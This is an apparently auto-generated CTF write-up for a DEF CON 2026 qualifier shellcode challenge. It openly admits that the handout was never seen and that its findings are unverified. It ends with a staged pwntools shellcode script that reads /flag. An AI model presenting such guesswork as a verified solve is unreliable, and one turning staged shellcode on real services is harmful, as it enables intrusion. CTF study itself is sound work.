@@ -1,0 +1,113 @@
+---
+title: "shelldiet — DEF CON CTF Qualifier 2026"
+date: 2026-06-27
+author: "Imattas aka Zemi"
+slug: "defcon-2026-qualifiers-shelldiet"
+order: 96
+writeupKind: "challenge"
+ctfSlug: "defcon-2026-qualifiers"
+ctfTitle: "DEF CON CTF Qualifier 2026"
+---
+# shelldiet — DEF CON CTF Qualifier 2026
+
+> **Category:** `Binary Exploitation`  
+> **Difficulty:** Hard  
+> **Points:** 1143  
+> **Author:** Imattas aka Zemi  
+> **Flag:** `bbb{REDACTED}`
+
+---
+
+## Challenge Description
+
+> Public challenge prompt was not recoverable from indexed sources.
+
+---
+
+## Recon / Initial Analysis
+
+Challenge name and point value were recovered from official index snippets; full handout was not archived.
+
+The first pass is to avoid guessing from the bird-themed prompt and instead build a small, repeatable workflow around the handout or service. For this file, the public archive did not expose enough verified challenge material to claim a completed solve transcript, so the writeup records the clean solve path I would use once the handout is available.
+
+```bash
+$ mkdir -p work/{handout,notes,scripts}
+$ file handout/* 2>/dev/null || true
+$ strings -a handout/* 2>/dev/null | head -50
+```
+
+---
+
+## Vulnerability / Observation
+
+Unverified. The expected observation is a seccomp/filter/length constraint that blocks normal shellcode and forces staged or alphanumeric construction.
+
+The name suggests a constrained shellcode task. Identify the filter, allowed byte budget, and syscall surface, then write the smallest staged payload that reads the flag.
+
+---
+
+## Exploitation / Solution
+
+### Step 1 — Rebuild the challenge context
+
+Keep the local environment close to the remote challenge. Save the original handout, record hashes, and write every probe as a command or script so the path can be repeated.
+
+```bash
+$ sha256sum handout/*
+$ tree -a handout
+```
+
+### Step 2 — Reduce the problem
+
+1. Disassemble the loader and list byte filters, length limits, and memory permissions.
+2. Dump seccomp rules if present with `seccomp-tools`.
+3. Start with shellcode that only performs one safe file/read/write path.
+4. If the byte budget is too small, use a first stage to read a larger second stage.
+5. Keep payload generation scripted to avoid manual byte mistakes.
+
+### Step 3 — Confirm the flag path
+
+The final check is always local first: the script should either print `bbb{...}` directly or produce one artifact where the flag is visible. Only after that should the same payload or input be sent to the live challenge service.
+
+---
+
+## Full Exploit Script
+
+```python
+#!/usr/bin/env python3
+from pwn import *
+
+HOST = args.HOST or 'challenge.host'
+PORT = int(args.PORT or 31337)
+context.arch = 'amd64'
+
+# First stage: read a larger second stage into executable memory.
+stage1 = asm("""
+    xor edi, edi
+    lea rsi, [rip]
+    mov edx, 0x400
+    xor eax, eax
+    syscall
+    jmp rsi
+""")
+
+# Second stage should be adapted to the confirmed seccomp rules.
+stage2 = asm(shellcraft.open('/flag') + shellcraft.read('rax', 'rsp', 0x100) + shellcraft.write(1, 'rsp', 0x100))
+
+def main():
+    io = remote(HOST, PORT) if args.REMOTE else process('./challenge')
+    io.send(stage1)
+    io.send(stage2)
+    io.interactive()
+
+if __name__ == '__main__':
+    main()
+```
+
+---
+
+## Key Takeaways
+
+- Constrained shellcode tasks are about environment modeling first.
+- A tiny first-stage reader is often cleaner than over-optimizing one huge payload.
+- Do not submit this generated file as an official qualifying writeup without adding your own verified solve notes, command output, and final flag.
